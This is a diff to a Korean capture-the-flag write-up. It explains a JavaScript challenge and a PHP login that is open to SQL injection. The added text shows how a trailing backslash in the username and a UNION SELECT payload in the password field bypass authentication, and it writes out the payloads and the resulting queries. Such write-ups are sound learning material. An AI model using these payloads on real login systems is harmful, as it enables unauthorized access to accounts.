@@ -78,7 +78,7 @@ setTimeout(function() {
 두번째 줄 코드를 실행하게 된다. 그렇게 된다면 비동기식 코드 실행에 의해  두번째 코드가 먼저 결과가 나오게 될 수 도 있다.
 그렇게 된다면 플래그가 나올수 없게 되는 것이다. 그렇기 때문에 코드실행의 순서를 강제하기 위해 콜백함수를 사용하여야 한다.
 
-- #### payload 4 
+- #### payload 4
 - tab + enter 키를 10번 누르면 플래그가 나온다.
 - html코드에서 button태그의 순서를 랜덤으로 하지 않아서 가능했던 풀이 방법이다.
 
@@ -117,13 +117,17 @@ setTimeout(function() {
 <br>
 
 ```php
+<?php
 $query  = "select username from users where ";  //변수에 쿼리 문자열을 저장하고
 $query .= "username='{$username}' and password='{$password}';";  // 받아온 변수와 함께 다시 이어 붙인다.
+?>
 ```
 - 여기서 $username이란 변수의 마지막에 역슬래시가 들어가게 된다면
 
 ```php
+<?php
 "username='asdf\' and password='{$password}';"
+?>
 ```
 - $password 변수의 앞까지 전부 문자열이 되어버린다.
 - $password 변수부터는 다른 쿼리문을 집어넣는게 가능하다!
@@ -131,7 +135,7 @@ $query .= "username='{$username}' and password='{$password}';";  // 받아온 �
 <br>
 
 - SQL 구문 중에서 union구문을 쓰게 되면 두가지 쿼리를 동시에 사용하는 것이 가능  
-$password 에 
+$password 에
 > union select id username=”admin”;#  
 
 또는
@@ -160,6 +164,9 @@ $password 에
 > or username=0 limit 1,1;#
 - js콘솔에서 500 error를 띄워준다.
 - 500 error를 띄워 주는 것을 보고 테이블에는 guest계정만 있다고 판단했다.
+- 테이블에 guest계정만 있고 admin계정이 없다면 어떻게 풀어야하지;;
+
+## 바로!!
 
 <br>
 <br>
@@ -171,5 +178,25 @@ $password 에
 > username=asdf\  
 > password= union select "admin" from users;#
 
+- 위 입력값을 전송하게 되면 서버에서는
+```PHP
+<?php
+$query  = "select username from users where ";  
+$query .= "username='asdf\' and password='union select "admin" from users;#';";
+?>
+```
+- PHP코드에서는 이렇게 들어가게 되고 sql쿼리로 날리게 되면
+```sql
+select username from users where username='asdf\' and password=' union select "admin" from users;#';
+```
+
+- 이런식으로 asdf뒤에있는 single qoute가 무효화되면서 password조건의 첫 single qoute까지 문자열로 인식해버린다.
+- 뒤에다가는 union select구문을 사용하면 된다.
+- 이 문제를 푼 사람중에서는 as문을 사용한 컬럼명 조작한 풀이도 있다.
 
 
+```sql
+select username from users where username='asdf\' and password=' union select "admin" as username from users;#';
+```
+
+- 굳이 써야하나?
